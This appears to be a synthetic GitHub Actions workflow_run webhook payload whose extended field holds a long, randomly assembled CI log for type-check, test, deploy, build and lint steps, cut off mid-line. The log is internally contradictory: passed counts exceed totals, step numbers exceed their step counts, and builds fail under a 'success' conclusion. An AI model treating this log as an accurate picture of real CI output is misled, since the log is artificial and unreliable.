{
  "action": "completed",
  "workflow_run": {
    "id": 710,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-401",
    "head_sha": "bf2050942d30a806d751c893d05f4acd181580af",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-26T12:47:24.512145Z",
    "updated_at": "2025-11-26T12:51:56.220251Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "eve"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nReady.\nImage pulled successfully\nCompleted.\nDone.\nEnvironment: production\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-9936\nnpm install: added 113 packages\nException: RuntimeError\npip install: Successfully installed prettier-4.4\nTime: 27.186s\n\u2717 build failed with exit code 94\nFinished.\n[12:47:24] WARN: Deprecated API usage\nReady.\nLayer 2/13: RUN command\nBundling runtime.css\nMinifying vendor.js\n\u2713 All checks passed\n\u2713 validate completed\n[12:47:24] INFO: Connecting to database\nCreating production build...\nStep 2/18: Installing dependencies\nWaiting...\nStep 12/21: Installing dependencies\nRan 191 tests in 2s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 37 tests in 31s\nDone.\nArtifact uploaded: dist.zip (2MB)\nUsing Python 3.12\n[12:47:24] INFO: Starting build process\nyarn add: Done in 8.82s\n[12:47:24] DEBUG: Loading configuration\nWaiting...\n[12:47:24] INFO: Connecting to database\nStep 13/16: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompleted.\n[12:47:24] INFO: Connecting to database\n[12:47:24] WARN: Deprecated API usage\nCoverage: 100% statements, 64% branches\n[12:47:24] DEBUG: Loading configuration\nFetching from https://amazonaws.com/package.json\nPulling image: alpine:18\n[12:47:24] DEBUG: Query executed in 90ms\nCache hit for key-9463\nnpm notice: created a lockfile\npip install: Successfully installed eslint-2.8\nnpm notice: package.json updated\nStep 4/24: Testing\n\u2713 test completed\nnpm notice: created a lockfile\nStep 20/18: Deploying\nGET /status - 204 (55ms)\nStep 2/15: Testing\nLayer 9/10: RUN command\nOK\nImage pulled successfully\nBuilding Docker image...\nAlready up to date.\npip: Collecting prettier\nGET /health - 200 (36ms)\nAlready up to date.\nTest Suites: 28 passed, 33 total\nCompiling components/app.ts...\nLayer 7/10: RUN command\nBuilding Docker image...\npip: Downloading prettier-4.16.tar.gz\n[12:47:24] INFO: Cache refreshed\nTests: 55 passed, 408 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: build\n[12:47:24] ERROR: Connection failed\nStep 13/18: Linting\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: TypeError\nCreating production build...\nTest Suites: 28 passed, 30 total\nPushing to registry...\nBuilding Docker image...\nCompleted.\n[12:47:24] WARN: Deprecated API usage\nBuilding Docker image...\nCompiling src/app.ts...\npip install: Successfully installed axios-3.10\nCompiling components/service.java...\nCoverage: 80% statements, 87% branches\nMinifying main.js\nGenerating source maps...\nChecking out main branch\n\u2713 Task completed in 2163ms\nStep 10/19: Testing\nnpm install: resolved 1784 packages\nCompiling utils/index.js...\nChecking out develop branch\nnpm install: added 257 packages\nImage pulled successfully\nGenerating source maps...\nStep 1/21: Deploying\nCreating production build...\npip: Installing build dependencies...\n[12:47:24] ERROR: Connection failed\nFetching submodules...\nWARNING: webpack has known vulnerabilities\nVerifying...\nTransforming 603 files...\n[12:47:24] DEBUG: Memory usage: 257MB\nLayer 1/10: COPY command\n[12:47:24] INFO: Processing request\nVerifying...\nPushing to registry...\nFetching from https://registry.npmjs.org/package.json\nVerifying...\nSwitched to branch 'bugfix/task-521'\nStep 13/18: Installing dependencies\n\u2713 Step 'checkout' succeeded\nTLS handshake completed\n[12:47:24] DEBUG: Connection pool: 11 active\nSnapshots: 1 passed, 16 total\n\u2713 All checks passed\nTLS handshake completed\nnpm install: resolved 1113 packages\n[12:47:24] INFO: Request completed\nArtifact uploaded: build.tar.gz (34MB)\nProcessing...\nOK\nTLS handshake completed\nVerifying...\nCompiling src/app.ts...\nTests: 312 passed, 151 total\nLoading...\nCache restored successfully (126MB)\nCache miss for key-7413\nBundling runtime.css\n[12:47:24] DEBUG: Memory usage: 1616MB\n\u2713 All checks passed\nWARNING: webpack has known vulnerabilities\n\u2713 package completed\npip: Collecting react\n\u2713 build completed\nHEAD is now at cc34504\nCache restored successfully (19MB)\nBundling runtime.js\n[12:47:24] INFO: Connecting to database\n\u2717 build failed with exit code 80\nPushing to registry...\nHEAD is now at a45eb21\nStep 19/18: Running migrations\nCache invalidated: dependencies\n\u2713 Task completed in 3627ms\nPOST /upload - 201 (236ms)\npip: Installing build dependencies...\n  PASS: e2e/test_user_create.spec.js\nGET /api - 204 (38ms)\n\u2713 Step 'setup' succeeded\nInstalling express@5.14.0\nProcessing...\nOK\nReady.\n  PASS: test_user_create (441ms)\nProcessing...\n\u2717 build failed with exit code 28\nVerifying...\n=== Step type_check completed ===\n=== Step: restore_cache ===\nOptimizing 15 modules...\nPOST /upload - 201 (284ms)\nSnapshots: 9 passed, 19 total\n[12:47:24] INFO: Connecting to database\n[12:47:24] DEBUG: Initializing service\n[12:47:24] DEBUG: Memory usage: 1612MB\nnpm notice: created a lockfile\nFetching from https://npmjs.org/package.json\npip: Downloading jest-3.17.tar.gz\nCompiling lib/app.ts...\n[12:47:24] DEBUG: Initializing service\nFinished.\nRan 26 tests in 22s\nCache restored successfully (421MB)\nStep 17/18: Linting\nCreating production build...\nConnection established\nBuilding Docker image...\nBundling main.js\nSnapshots: 5 passed, 29 total\npip: Installing build dependencies...\nFetching submodules...\nStep 2/23: Installing dependencies\nSnapshots: 15 passed, 37 total\nStep 12/19: Running migrations\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nChecking out master branch\nCompiling src/service.java...\nStep 11/18: Linting\nnpm install: resolved 1505 packages\nUploading artifact 'dist' (14 files)\n[12:47:24] INFO: Connecting to database\npip: Installing build dependencies...\nImage pulled successfully\nUsing Python 3.11\n[12:47:24] DEBUG: Initializing service\n[12:47:24] DEBUG: Memory usage: 952MB\n[12:47:24] DEBUG: Query executed in 25ms\nStep 12/17: Building\n[12:47:24] DEBUG: Connection pool: 16 active\nFetching from https://github.com/package.json\n  PASS: test_cache_hit (225ms)\nGenerating source maps...\nCompleted.\nGenerating source maps...\nUploading artifact 'dist' (42 files)\nRan 164 tests in 45s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPulling image: alpine:latest\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCoverage: 100% statements, 96% branches\nEnvironment: test\n[12:47:24] WARN: Deprecated API usage\nCache miss for key-7047\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-1126\nEnvironment: production\nTLS handshake completed\nRan 94 tests in 38s\nArtifact uploaded: dist.zip (33MB)\nStep 8/23: Building\nPulling image: node:3.11\nFetching submodules...\nTest Suites: 35 passed, 10 total\nHEAD is now at 2bac3b1\n[12:47:24] WARN: Deprecated API usage\nGET /api - 204 (23ms)\nGET /health - 201 (43ms)\nFinished.\nPushing to registry...\npip: Collecting lodash\nTests: 122 passed, 58 total\nFetching from https://pypi.org/package.json\nCompiling components/app.ts...\nChecking out main branch\nCache restored successfully (376MB)\nCache saved successfully\nInstalling axios@4.11.10\nStep 5/16: Running migrations\nNODE_ENV=development\nPOST /data - 202 (218ms)\nBundling main.css\nCache invalidated: build\n[12:47:24] INFO: Cache refreshed\nDone.\nCache invalidated: build\nFinished.\nFinished.\n\u2713 test completed\npip install: Successfully installed react-2.11\nFinished.\nBundling vendor.js\nArtifact uploaded: dist.zip (79MB)\npip: Downloading jest-4.0.tar.gz\npip install: Successfully installed lodash-4.15\nTest Suites: 35 passed, 8 total\nChecking out master branch\nUsing Python 3.9\nCache invalidated: node_modules\npip: Installing build dependencies...\nWaiting...\nRan 90 tests in 34s\nAlready up to date.\nStep 12/25: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:24] DEBUG: Loading configuration\nyarn add: Done in 20.53s\nImage pulled successfully\npip: Installing build dependencies...\nOptimizing 57 modules...\nPOST /api - 200 (325ms)\nImage pulled successfully\nStep 12/15: Building\nnpm install: resolved 1475 packages\nUsing Python 3.12\nFinished.\n\u2713 Step 'setup' succeeded\nDone.\nArtifact uploaded: dist.zip (74MB)\nTest Suites: 14 passed, 34 total\n\u2713 lint completed\nCompiling lib/index.js...\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] INFO: Cache refreshed\n  PASS: e2e/test_api_health.spec.js\nTime: 87.167s\nNODE_ENV=test\nMinifying app.js\n[12:47:24] WARN: Deprecated API usage\nHEAD is now at c1ca127\nCompiling lib/main.py...\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact downloaded: 11MB\nReady.\nFAILED: test_api_health\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:24] INFO: Request completed\nTest Suites: 47 passed, 6 total\nCache restored successfully (337MB)\npip install: Successfully installed express-4.18\nNODE_ENV=test\nCache hit for key-2773\nReady.\npip install: Successfully installed axios-4.17\nCreating production build...\nStep 19/23: Installing dependencies\nStep 5/19: Linting\nnpm notice: package.json updated\nCreating production build...\nGET /api - 200 (30ms)\n[12:47:24] INFO: Request completed\nTime: 27.249s\nMinifying vendor.js\n  PASS: test_auth_login (338ms)\n\u2713 All checks passed\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] DEBUG: Query executed in 68ms\nSnapshots: 9 passed, 39 total\nCache restored successfully (64MB)\n[12:47:24] INFO: Processing request\n\u2713 package completed\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 Step 'build' succeeded\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\nCache invalidated: build\nBuilding Docker image...\nGenerating source maps...\nFetching submodules...\nUsing Python 3.9\nStep 12/23: Deploying\n[12:47:24] INFO: Request completed\nOptimizing 96 modules...\nCreating production build...\n[12:47:24] WARN: Deprecated API usage\nBuilding Docker image...\nOptimizing 56 modules...\nPulling image: alpine:18\nOK\nSnapshots: 19 passed, 48 total\nGenerating source maps...\nUsing Node.js 18.14.0\nnpm install: resolved 1025 packages\nBuilding Docker image...\n[12:47:24] INFO: Cache refreshed\nLoading...\nArtifact downloaded: 49MB\nWARNING: eslint has known vulnerabilities\nFAILED: test_db_connect\n\u2713 Task completed in 4352ms\n\u2713 validate completed\nAlready up to date.\nnpm notice: created a lockfile\nOptimizing 72 modules...\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWaiting...\n[12:47:24] INFO: Starting build process\nFetching from https://amazonaws.com/package.json\nBundling vendor.js\nArtifact uploaded: build.tar.gz (49MB)\nUsing Python 3.11\nCache saved successfully\nFAILED: test_cache_hit\nPulling image: node:18\nReady.\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] ERROR: Connection failed\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: created a lockfile\nArtifact uploaded: dist.zip (90MB)\nHEAD is now at 9f1e376\nHEAD is now at 4e25f17\nyarn add: Done in 11.27s\nArtifact uploaded: dist.zip (51MB)\nCache restored successfully (78MB)\nAlready up to date.\nRan 154 tests in 34s\nUsing Node.js 17.17.4\nPlatform: darwin-arm64\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_auth_login (246ms)\nSuccess!\nAlready up to date.\nCache saved successfully\n\u2713 All checks passed\nInstalling lodash@5.6.9\nCompiling src/app.ts...\npip: Downloading axios-3.11.tar.gz\nCompiling utils/main.py...\nArtifact downloaded: 44MB\nLoading...\nArtifact uploaded: build.tar.gz (37MB)\nnpm notice: package.json updated\npip: Collecting lodash\nWaiting...\nSnapshots: 17 passed, 24 total\nTransforming 855 files...\n\u2713 build completed\nWARNING: react has known vulnerabilities\nCompiling components/service.java...\nnpm install: added 299 packages\nCache miss for key-1112\nStep 11/21: Running migrations\nnpm notice: package.json updated\nMinifying vendor.js\nFetching submodules...\nDone.\nException: RuntimeError\nInstalling lodash@1.19.4\nHEAD is now at 61ab58c\nCompiling utils/utils.go...\n  PASS: test_user_create (367ms)\nBundling vendor.js\nPOST /api - 201 (421ms)\nBundling styles.css\nPushing to registry...\nTest Suites: 38 passed, 37 total\nPulling image: python:3.11\nConnection established\nTest Suites: 23 passed, 19 total\n[12:47:24] DEBUG: Initializing service\n\u2713 package completed\n[12:47:24] DEBUG: Connection pool: 16 active\nSnapshots: 17 passed, 31 total\nHEAD is now at 10f208c\n[12:47:24] INFO: Request completed\nCreating production build...\n  PASS: test_cache_hit (422ms)\npip install: Successfully installed express-3.15\nTest Suites: 34 passed, 26 total\nCache hit for key-4957\npip install: Successfully installed jest-2.11\n[12:47:24] INFO: Cache refreshed\n\u2713 deploy completed\nGET /api - 200 (64ms)\nUploading artifact 'build' (17 files)\nLoading...\nCache restored successfully (263MB)\nStep 9/25: Deploying\nnpm install: resolved 1563 packages\npip: Installing build dependencies...\nSnapshots: 36 passed, 5 total\nTest Suites: 46 passed, 45 total\nTests: 220 passed, 217 total\nTLS handshake completed\nRan 160 tests in 4s\nWARNING: react has known vulnerabilities\n[12:47:24] INFO: Processing request\nCompiling src/utils.go...\nDone.\nCompiling lib/index.js...\nWARNING: react has known vulnerabilities\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFetching from https://githubusercontent.com/package.json\nStep 14/15: Testing\nProcessing...\nTest Suites: 7 passed, 43 total\n\u2713 Step 'test' succeeded\nOK\nHEAD is now at 9368e65\nnpm install: resolved 1039 packages\nStep 20/17: Building\nnpm notice: created a lockfile\nFinished.\nWARNING: jest has known vulnerabilities\npip: Installing build dependencies...\nWARNING: webpack has known vulnerabilities\n[12:47:24] DEBUG: Connection pool: 17 active\nLayer 10/15: RUN command\nStep 16/25: Building\n[12:47:24] DEBUG: Initializing service\nUsing Node.js 17.10.3\nOK\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nNODE_ENV=production\nConnection established\n[12:47:24] INFO: Connecting to database\nCompiling src/service.java...\nAlready up to date.\nCache saved successfully\nnpm install: resolved 297 packages\nPushing to registry...\nStep 18/20: Running migrations\nTransforming 584 files...\nUploading artifact 'build' (20 files)\nInstalling webpack@3.15.9\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTest Suites: 25 passed, 9 total\n=== Step unit_tests completed ===\n=== Step: deploy_production ===\npip install: Successfully installed axios-1.5\nLoading...\nDone.\nStep 8/24: Linting\nCompiling utils/app.ts...\nCompiling lib/handler.rs...\npip install: Successfully installed express-3.5\nCache restored successfully (291MB)\nStep 11/18: Running migrations\nLoading...\n\u2713 Task completed in 1644ms\nCreating production build...\n  PASS: test_cache_hit (287ms)\npip: Downloading axios-2.19.tar.gz\nFetching submodules...\nStep 2/21: Linting\nPOST /upload - 200 (434ms)\nStep 4/17: Deploying\n[12:47:24] INFO: Request completed\nStep 18/16: Building\n\u2713 build completed\nLayer 4/15: COPY command\nStep 9/21: Deploying\nCache miss for key-8264\nFetching from https://googleapis.com/package.json\nPlatform: darwin-arm64\n[12:47:24] DEBUG: Connection pool: 3 active\nUsing Node.js 14.13.1\nBuilding Docker image...\nGET /api - 200 (52ms)\nGET /health - 200 (89ms)\n[12:47:24] INFO: Processing request\nStep 5/19: Deploying\nSnapshots: 19 passed, 16 total\nnpm install: added 289 packages\nStep 13/16: Installing dependencies\nTests: 257 passed, 341 total\nCompiling utils/utils.go...\nOptimizing 96 modules...\npip: Collecting webpack\nFetching from https://registry.npmjs.org/package.json\nReady.\nGET /status - 200 (65ms)\nArtifact uploaded: build.tar.gz (27MB)\npip: Downloading axios-1.10.tar.gz\npip: Downloading react-4.2.tar.gz\nCache hit for key-5769\nNODE_ENV=production\nCache saved successfully\nBundling vendor.js\nCache miss for key-1834\nnpm notice: package.json updated\nTest Suites: 14 passed, 24 total\nnpm notice: package.json updated\nCreating production build...\nUploading artifact 'coverage' (49 files)\nGET /health - 201 (78ms)\n[12:47:24] INFO: Request completed\nOK\nnpm notice: created a lockfile\n[12:47:24] INFO: Processing request\nStep 8/15: Deploying\nyarn add: Done in 8.97s\npip install: Successfully installed webpack-2.18\n  PASS: unit/test_cache_hit.spec.js\nTests: 247 passed, 341 total\nRan 106 tests in 33s\n[12:47:24] INFO: Processing request\n\u2713 Task completed in 1951ms\nGET /api - 204 (28ms)\npip: Collecting axios\nRan 145 tests in 18s\n\u2713 Step 'checkout' succeeded\nTest Suites: 33 passed, 22 total\nChecking out develop branch\nCache hit for key-1316\nPushing to registry...\nBundling vendor.js\nTime: 50.134s\nPushing to registry...\n[12:47:24] INFO: Starting build process\nStep 12/22: Deploying\nUsing Node.js 15.12.2\nStep 3/15: Deploying\nStep 20/21: Running migrations\nUsing Python 3.9\nOK\nStep 9/15: Testing\nFinished.\nFAILED: test_cache_hit\n\u2713 Task completed in 3578ms\nException: RuntimeError\nMinifying main.js\n  PASS: test_db_connect (273ms)\nLoading...\nImage pulled successfully\nPOST /upload - 202 (102ms)\nOptimizing 57 modules...\npip: Downloading eslint-4.14.tar.gz\nUsing Python 3.11\n\u2713 All checks passed\n[12:47:24] INFO: Cache refreshed\nUsing Python 3.11\nWARNING: express has known vulnerabilities\nArtifact uploaded: build.tar.gz (40MB)\nCompleted.\nnpm notice: package.json updated\nPulling image: node:latest\nVerifying...\n[12:47:24] INFO: Processing request\nCompiling src/index.js...\nStep 18/19: Installing dependencies\nCache miss for key-3883\nDone.\npip: Collecting webpack\npip install: Successfully installed react-3.8\nImage pulled successfully\nCoverage: 88% statements, 100% branches\n[12:47:24] WARN: Deprecated API usage\nUploading artifact 'build' (14 files)\nTest Suites: 20 passed, 11 total\nReady.\n[12:47:24] INFO: Starting build process\nStep 12/21: Testing\nFetching from https://gcr.io/package.json\nProcessing...\npip: Installing build dependencies...\nVerifying...\npip: Downloading lodash-4.13.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\n[12:47:24] INFO: Request completed\nArtifact uploaded: build.tar.gz (27MB)\nStep 3/16: Building\nProcessing...\nFetching from https://docker.io/package.json\nGenerating source maps...\nFinished.\nCompleted.\n[12:47:24] INFO: Cache refreshed\nBundling main.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\npip install: Successfully installed webpack-3.11\nCache miss for key-7633\nRan 144 tests in 9s\n\u2713 Step 'checkout' succeeded\n[12:47:24] WARN: Deprecated API usage\nEnvironment: development\nOK\nAlready up to date.\n  PASS: test_db_connect (176ms)\nTests: 73 passed, 311 total\nStep 19/22: Installing dependencies\nDone.\nBuilding Docker image...\npip: Installing build dependencies...\n[12:47:24] INFO: Connecting to database\nOK\n[12:47:24] DEBUG: Query executed in 89ms\nCache invalidated: node_modules\nException: NullPointerException\nFetching from https://docker.io/package.json\nGET /status - 204 (98ms)\nArtifact downloaded: 43MB\nCompiling utils/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n=== Step deploy_production completed ===\n=== Step: build ===\nWaiting...\nChecking out develop branch\nBuilding Docker image...\nBuilding Docker image...\nnpm notice: package.json updated\nFetching submodules...\n[12:47:24] INFO: Request completed\nnpm notice: package.json updated\nChecking out develop branch\nArtifact downloaded: 50MB\nPlatform: win32-x64\nCache restored successfully (437MB)\nGenerating source maps...\n\u2713 All checks passed\nCompiling lib/index.js...\nFinished.\npip: Downloading jest-4.15.tar.gz\n[12:47:24] INFO: Starting build process\nBundling vendor.css\nArtifact uploaded: dist.zip (50MB)\nBuilding Docker image...\n[12:47:24] DEBUG: Query executed in 39ms\npip install: Successfully installed eslint-3.8\nnpm install: added 352 packages\n[12:47:24] INFO: Connecting to database\n[12:47:24] INFO: Connecting to database\nBundling vendor.css\nFetching submodules...\nStep 16/20: Installing dependencies\nGET /api - 200 (24ms)\nFetching submodules...\n[12:47:24] INFO: Request completed\nFinished.\n[12:47:24] ERROR: Connection failed\nStep 20/21: Linting\nCache saved successfully\nUploading artifact 'dist' (15 files)\nnpm notice: created a lockfile\nStep 13/19: Deploying\n[12:47:24] INFO: Processing request\n\u2713 Step 'checkout' succeeded\nArtifact downloaded: 5MB\nAlready up to date.\nWARNING: prettier has known vulnerabilities\nFetching submodules...\nPulling image: alpine:18\npip install: Successfully installed react-4.9\npip: Collecting jest\npip install: Successfully installed jest-5.17\nnpm notice: package.json updated\n[12:47:24] WARN: Deprecated API usage\nUploading artifact 'build' (12 files)\n\u2713 Step 'setup' succeeded\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] DEBUG: Initializing service\nLoading...\n[12:47:24] WARN: Deprecated API usage\nnpm notice: package.json updated\nWaiting...\nWARNING: express has known vulnerabilities\nWaiting...\nChecking out main branch\nyarn add: Done in 5.8s\npip: Collecting axios\nGET /status - 201 (100ms)\n\u2713 Task completed in 3782ms\nFetching submodules...\nStep 9/16: Deploying\nTest Suites: 36 passed, 37 total\nFinished.\nMinifying app.js\nUploading artifact 'coverage' (7 files)\nWARNING: react has known vulnerabilities\n[12:47:24] DEBUG: Memory usage: 1765MB\n  PASS: test_cache_hit (261ms)\n[12:47:24] DEBUG: Query executed in 52ms\nTest Suites: 49 passed, 41 total\nSnapshots: 31 passed, 30 total\n\u2717 build failed with exit code 9\nChecking out master branch\nNODE_ENV=development\nDone.\nDone.\nArtifact downloaded: 18MB\nReady.\n[12:47:24] INFO: Request completed\nConnection established\nPulling image: python:3.11\n[12:47:24] DEBUG: Query executed in 59ms\nStep 19/17: Linting\nLayer 1/13: COPY command\n[12:47:24] INFO: Cache refreshed\n\u2713 All checks passed\nSuccess!\nCompleted.\nNODE_ENV=development\nFetching submodules...\nyarn add: Done in 16.48s\nReady.\n[12:47:24] INFO: Cache refreshed\nArtifact uploaded: dist.zip (14MB)\n[12:47:24] DEBUG: Loading configuration\n[12:47:24] WARN: Deprecated API usage\nOptimizing 23 modules...\nCompiling src/handler.rs...\nCompiling src/main.py...\nStep 15/23: Linting\nCreating production build...\nTime: 18.50s\nFAILED: test_cache_hit\nUsing Node.js 16.1.6\nnpm notice: created a lockfile\n  PASS: integration/test_cache_hit.spec.js\nArtifact uploaded: dist.zip (58MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 9/16: Building\nWARNING: axios has known vulnerabilities\nSuccess!\nTLS handshake completed\n\u2713 Step 'test' succeeded\nProcessing...\n\u2713 All checks passed\nFetching from https://registry.npmjs.org/package.json\nnpm install: resolved 1235 packages\nCache hit for key-3921\n  PASS: integration/test_auth_login.spec.js\n  PASS: test_cache_hit (212ms)\nStep 19/24: Testing\n  PASS: test_user_create (296ms)\nChecking out main branch\nStep 4/18: Deploying\nCompiling components/service.java...\n\u2717 build failed with exit code 66\nInstalling jest@1.0.8\nSnapshots: 12 passed, 35 total\nGenerating source maps...\n\u2713 All checks passed\nDone.\n[12:47:24] INFO: Cache refreshed\n\u2713 Task completed in 2630ms\nTransforming 443 files...\nImage pulled successfully\nFetching submodules...\nUsing Node.js 19.5.9\npip install: Successfully installed eslint-1.16\n[12:47:24] WARN: Deprecated API usage\nUsing Node.js 19.0.4\nArtifact downloaded: 17MB\nBundling runtime.js\nnpm notice: package.json updated\nCompiling src/index.js...\n[12:47:24] DEBUG: Initializing service\nFetching submodules...\nStep 13/22: Deploying\nReady.\nHEAD is now at 232cd19\nChecking out master branch\nBuilding Docker image...\n[12:47:24] WARN: Deprecated API usage\nCompiling components/service.java...\nCache miss for key-2096\nPulling image: alpine:3.11\nRan 46 tests in 28s\nBuilding Docker image...\nPushing to registry...\nTests: 204 passed, 205 total\n=== Step build completed ===\n=== Step: setup_node ===\nTests: 259 passed, 359 total\nVerifying...\nCache invalidated: node_modules\nArtifact downloaded: 26MB\nUploading artifact 'coverage' (49 files)\nLoading...\npip install: Successfully installed eslint-5.8\nFinished.\nBuilding Docker image...\nReady.\nCoverage: 94% statements, 96% branches\nArtifact uploaded: build.tar.gz (32MB)\nStep 4/15: Deploying\nBundling main.css\nLoading...\n\u2713 Task completed in 319ms\nCache hit for key-5075\nSuccess!\nStep 12/18: Linting\nnpm install: resolved 1559 packages\nCache miss for key-8592\nCompiling components/index.js...\nImage pulled successfully\n\u2713 Step 'test' succeeded\nStep 20/19: Linting\n[12:47:24] INFO: Starting build process\n\u2713 validate completed\nMinifying main.js\nMinifying app.js\nStep 10/20: Running migrations\nCache restored successfully (147MB)\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] DEBUG: Loading configuration\nSuccess!\nImage pulled successfully\nFetching submodules...\nEnvironment: development\nConnection established\n  PASS: e2e/test_auth_login.spec.js\nPushing to registry...\nHEAD is now at c25f15e\nUsing Python 3.12\n  PASS: integration/test_cache_hit.spec.js\nFetching submodules...\nCompiling components/utils.go...\nStep 14/21: Running migrations\nArtifact uploaded: build.tar.gz (6MB)\nDone.\nOptimizing 46 modules...\n[12:47:24] INFO: Cache refreshed\nnpm notice: created a lockfile\nFetching from https://googleapis.com/package.json\n\u2713 deploy completed\nDone.\n  PASS: test_api_health (500ms)\nOK\nStep 18/25: Installing dependencies\nCache saved successfully\n[12:47:24] DEBUG: Connection pool: 20 active\nTransforming 720 files...\nCompiling src/handler.rs...\npip: Downloading webpack-1.4.tar.gz\nUploading artifact 'coverage' (30 files)\nPulling image: node:18\nFetching submodules...\nDone.\nUploading artifact 'build' (50 files)\nTransforming 222 files...\nAlready up to date.\nWARNING: react has known vulnerabilities\n[12:47:24] WARN: Deprecated API usage\nCompiling utils/utils.go...\npip: Downloading jest-5.0.tar.gz\nCompiling lib/app.ts...\nPushing to registry...\nCache saved successfully\nVerifying...\n\u2713 validate completed\nStep 11/18: Linting\nStep 13/20: Installing dependencies\nException: RuntimeError\n[12:47:24] WARN: Deprecated API usage\nConnection established\nCache miss for key-4045\nCoverage: 80% statements, 68% branches\n\u2713 Step 'build' succeeded\nStep 7/18: Deploying\nCompiling utils/utils.go...\nGenerating source maps...\nUsing Python 3.11\nFinished.\nCreating production build...\n[12:47:24] DEBUG: Memory usage: 1241MB\nBundling runtime.js\n  PASS: test_cache_hit (58ms)\nGET /status - 201 (82ms)\nTest Suites: 29 passed, 28 total\nUsing Node.js 15.14.5\n[12:47:24] DEBUG: Query executed in 81ms\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:24] INFO: Connecting to database\nUsing Node.js 18.13.10\nChecking out master branch\n  PASS: test_api_health (310ms)\nCache saved successfully\n\u2713 Task completed in 3410ms\n\u2713 All checks passed\nnpm notice: created a lockfile\nPulling image: node:18\nEnvironment: staging\nOK\n[12:47:24] DEBUG: Connection pool: 20 active\nCache saved successfully\nWARNING: webpack has known vulnerabilities\nLoading...\nImage pulled successfully\nnpm notice: package.json updated\nnpm install: added 373 packages\n\u2713 Step 'install' succeeded\n[12:47:24] INFO: Starting build process\nSwitched to branch 'bugfix/task-779'\n\u2713 All checks passed\n  PASS: unit/test_user_create.spec.js\nEnvironment: staging\nWaiting...\nCache invalidated: dependencies\nCache miss for key-3086\nnpm notice: package.json updated\nTransforming 740 files...\nChecking out master branch\n[12:47:24] ERROR: Connection failed\nArtifact uploaded: dist.zip (100MB)\nUploading artifact 'coverage' (38 files)\nStep 6/17: Installing dependencies\nStep 1/17: Running migrations\n[12:47:24] DEBUG: Loading configuration\nVerifying...\nPulling image: python:18\n[12:47:24] WARN: Deprecated API usage\nDone.\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:24] WARN: Deprecated API usage\nCompiling utils/service.java...\n[12:47:24] DEBUG: Memory usage: 1690MB\nHEAD is now at 23aef02\nyarn add: Done in 10.32s\nCompleted.\nRan 26 tests in 41s\nUsing Python 3.11\nReady.\n[12:47:24] INFO: Processing request\nLayer 9/12: COPY command\nChecking out master branch\nUsing Python 3.11\nCoverage: 81% statements, 61% branches\nCompiling lib/index.js...\nDone.\nProcessing...\nUploading artifact 'build' (37 files)\nEnvironment: production\n  PASS: test_user_create (453ms)\nCoverage: 77% statements, 73% branches\nFinished.\nSwitched to branch 'hotfix/task-678'\nCompiling lib/main.py...\n=== Step setup_node completed ===\n=== Step: lint ===\nTest Suites: 26 passed, 26 total\n\u2713 lint completed\nHEAD is now at b647418\n\u2713 deploy completed\nChecking out main branch\nTLS handshake completed\nTest Suites: 24 passed, 32 total\n[12:47:24] WARN: Deprecated API usage\n[12:47:24] DEBUG: Loading configuration\n[12:47:24] DEBUG: Connection pool: 8 active\n[12:47:24] DEBUG: Query executed in 5ms\nCompiling lib/index.js...\nCoverage: 88% statements, 94% branches\n[12:47:24] DEBUG: Initializing service\npip: Installing build dependencies...\nNODE_ENV=production\nGenerating source maps...\nStep 10/22: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nReady.\nnpm notice: created a lockfile\nStep 16/24: Testing\nWARNING: webpack has known vulnerabilities\nStep 4/21: Building\nnpm notice: created a lockfile\n[12:47:24] WARN: Deprecated API usage\nOK\n[12:47:24] INFO: Connecting to database\n[12:47:24] DEBUG: Query executed in 46ms\nStep 13/16: Testing\nWARNING: prettier has known vulnerabilities\nMinifying main.js\nCompleted.\n\u2713 lint completed\nCache invalidated: node_modules\nConnection established\nCoverage: 76% statements, 66% branches\nPlatform: darwin-arm64\n\u2713 All checks passed\nCache hit for key-9276\nUsing Node.js 18.2.5\nCompiling src/service.java...\nCompiling src/app.ts...\nFAILED: test_cache_hit\nOptimizing 79 modules...\nUploading artifact 'build' (21 files)\nLoading...\nVerifying...\nPOST /data - 200 (222ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\n\u2713 Task completed in 2474ms\n\u2713 Step 'build' succeeded\nArtifact uploaded: dist.zip 